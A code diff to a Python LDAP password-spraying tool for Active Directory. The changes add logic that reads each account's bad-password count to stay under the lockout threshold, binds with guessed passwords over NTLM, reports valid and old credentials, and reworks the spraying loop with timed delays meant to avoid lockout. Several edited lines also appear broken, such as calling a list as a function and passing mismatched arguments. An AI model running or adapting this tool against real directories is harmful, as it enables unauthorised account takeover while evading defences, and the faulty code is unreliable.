@@ -8,8 +8,39 @@ from typing import List, Dict
 import os
 from itertools import combinations
 from datetime import datetime
-import pytz
 from datetime import datetime, timedelta, timezone
+
+class UserPasswordContainer:
+    def __init__(self, domain, username, passwords):
+        self.domain = domain
+        self.username = username
+        self.passwords = [pw for _, pw in sorted(passwords, key=lambda x: -x[0])]
+        self.password_index = 0
+
+    def try_next_password(self, real_conn, server, lockoutThreshold, verbose):
+        badpwd = -1
+        try:
+            badpwd_filter = f'(sAMAccountName={self.username})'
+            base_dn = server.info.other['defaultNamingContext'][0]
+            real_conn.search(search_base=base_dn, search_filter=badpwd_filter, attributes=['badPwdCount'])
+            badpwd = real_conn.entries[0].badPwdCount
+            if badpwd + 1 >= lockoutThreshold:
+                if verbose:
+                    print(f"[*] Password try for {self.username} was skipped because badpwd was {badpwd} while threshold is {lockoutThreshold}")
+                return False
+            conn = Connection(server, user=f'{self.domain}\\{self.username}', password=self.passwords[self.password_index], auto_bind=True, authentication='NTLM')
+            print(f"[+] VALID CREDENTIAL FOUND: {self.username}:{self.passwords[self.password_index]}")
+            return True
+        except LDAPBindError:
+            badpwd_filter = f'(sAMAccountName={self.username})'
+            base_dn = server.info.other['defaultNamingContext'][0]
+            real_conn.search(search_base=base_dn, search_filter=badpwd_filter, attributes=['badPwdCount'])
+            badpwd2 = real_conn.entries[0].badPwdCount
+            if badpwd == badpwd2:
+                print(f"[!] {self.passwords[self.password_index]} was an old password for {self.username}")
+            self.password_index += 1
+            return False
+
 
 LEET_MAP = {
     'o': '0',
@@ -232,21 +263,10 @@ def generate_passwords_from_toml(config_path, user_attributes, min_length, custo
             combined_vars.update(local_vars)
             exec(code, {}, combined_vars)
 
-
         for pw in passwords:
             if len(pw) >= min_length:
                 all_passwords.append((importance, pw))
     return [pw for _, pw in sorted(all_passwords, key=lambda x: -x[0])]
-
-def get_PDC(server, domain, user, password):
-    conn = get_connection(server, domain, user, password)
-    dn = server.info.other['defaultNamingContext'][0]
-
-    # Query fsmoRoleOwner
-    pdc_dn = f"CN=domainDNS,{dn}"
-    conn.search(pdc_dn, '(objectClass=*)', search_scope='BASE', attributes=['PDC Emulator'])
-    return conn.entries
-
 
 def main():
     parser = argparse.ArgumentParser(description='LDAP Bruteforcer for Active Directory')
@@ -268,7 +288,6 @@ def main():
     server = Server(args.host, get_info=ALL)
     base_dn = get_default_naming_context(server, args.domain, args.valid_user, args.valid_pass)
     policy = get_lockout_policy(server, base_dn, args.domain, args.valid_user, args.valid_pass)
-    pdc = get_PDC(server, args.domain, args.valid_user, args.valid_pass)
 
     dynamic_delay = policy['lockoutObservationWindow'] + args.extra_delay if policy['lockoutObservationWindow'] > 0 else 1.0 + args.extra_delay
 
@@ -277,7 +296,6 @@ def main():
     print(f"[*] Lockout Duration: {policy['lockoutDuration']} seconds")
     print(f"[*] Password Complexity: {policy['pwdProperties']}")
     print(f"[*] Minimum Password Length: {policy['minPwdLength']}")
-    print(f"[*] PDC: {pdc}")
     if args.verbose:
         print("[*] Enumerating users...")
 
@@ -298,55 +316,36 @@ def main():
     
     time_based_tries = parse_time_based_tries(args.time_based_tries)
 
-    user_passwords_map = {}
-    max_passwords = 0
+    all_attempts: List[UserPasswordContainer] = []
 
     for user in filtered_users:
         passwords = generate_passwords_from_toml(args.patterns, user, policy['minPwdLength'], {"complex_password" : policy['pwdProperties']})
-        user_passwords_map[user['sAMAccountName']] = passwords
-        max_passwords = max(max_passwords, len(passwords))
+        all_attempts(UserPasswordContainer(args.domain, user['sAMAccountName'], passwords))
 
     if args.only_show_generated_passwords:
-        for username, passwords in user_passwords_map.items():
-            for pw in passwords:
-                print(f"{username}:{pw}")
+        for container in all_attempts:
+            for pw in container.passwords:
+                print(f"{container.username}:{pw}")
         return
     
     print(f"[*] Maximum passwords to try per user:")
-    for username, passwords in user_passwords_map.items():
-        print(f"{username}:{len(passwords)}")
+    for container in all_attempts:
+        print(f"{container.username}:{len(container.passwords)}")
 
-    days, hours, minutes, seconds, end_time = calculate_total_duration(max_passwords, args.tries_per_wait, dynamic_delay, time_based_tries, get_current_time())
+    days, hours, minutes, seconds, end_time = calculate_total_duration(max(all_attempts, key=lambda x: len(x.passwords)), args.tries_per_wait, dynamic_delay, time_based_tries, get_current_time())
     print(f"[*] Estimated total bruteforce duration: {days} days, {hours} hours, {minutes} minutes, {seconds} seconds")
     print(f"[*] Estimated finish time (UTC): {end_time}")
 
     if args.check == 2:
         return
 
-    found_for_user = []
-
-    for i in range(max_passwords):
-        tries_per_wait = get_tries_for_time(time_based_tries, get_current_time(), args.tries_per_wait)
-        while tries_per_wait > 0:
-            tries_per_wait -= 1
-            print(f"[*] Trying password round {i+1}/{max_passwords}")
-            
-            for user in filtered_users:
-                username = user['sAMAccountName']
-                if username in found_for_user:
-                    continue
-                pw_list = user_passwords_map.get(username, [])
-                if i < len(pw_list):
-                    pw = pw_list[i]
-                    success = try_bind(server, args.domain, username, pw)
-                    if args.verbose:
-                        print(f"[-] Tried {username}:{pw} => {'Success' if success else 'Fail'}")
-                    if success:
-                        found_for_user.append(username)
-                        print(f"[+] VALID CREDENTIAL FOUND: {username}:{pw}")
-            i += 1
-
-        print(f"[*] Sleeping for {dynamic_delay:.2f} seconds to avoid lockout...")
+    while len(all_attempts) > 0:
+        conn = get_connection(server, args.domain, args.domain, args.valid_user, args.valid_pass)
+        for container in all_attempts[:]:
+            if container.try_next_password(conn, server, policy['lockoutThreshold'], True):
+                all_attempts.remove(container)
+        if args.verbose:
+            print(f"[*] Sleeping for {dynamic_delay:.2f} seconds to avoid lockout...")
         time.sleep(dynamic_delay)
 
 if __name__ == '__main__':
